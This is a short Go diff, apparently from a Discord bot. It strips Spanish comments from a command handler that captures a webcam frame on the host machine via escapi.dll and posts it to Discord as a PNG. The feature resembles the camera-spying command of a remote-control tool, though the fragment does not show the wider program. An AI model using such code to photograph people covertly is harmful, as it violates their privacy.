@@ -22,15 +22,12 @@ const (
 	camHeight = 480
 )
 
-// simpleCapParams replica struct SimpleCapParams de escapi.h.
 type simpleCapParams struct {
 	TargetBuf *int32
 	Width     int32
 	Height    int32
 }
 
-// Webcam captura un frame con escapi.dll y lo sube como PNG. Si la DLL o la
-// cámara no están disponibles, responde con un embed de fallback.
 func Webcam(s *discordgo.Session, i *discordgo.InteractionCreate) {
 	if err := Defer(s, i); err != nil {
 		return
@@ -158,7 +155,6 @@ func captureWebcam() ([]byte, error) {
 		time.Sleep(50 * time.Millisecond)
 	}
 
-	// ESCAPI entrega 32 bits por píxel en orden BGRA.
 	img := image.NewRGBA(image.Rect(0, 0, camWidth, camHeight))
 	for index := 0; index+3 < len(buf); index += 4 {
 		img.Pix[index] = buf[index+2]
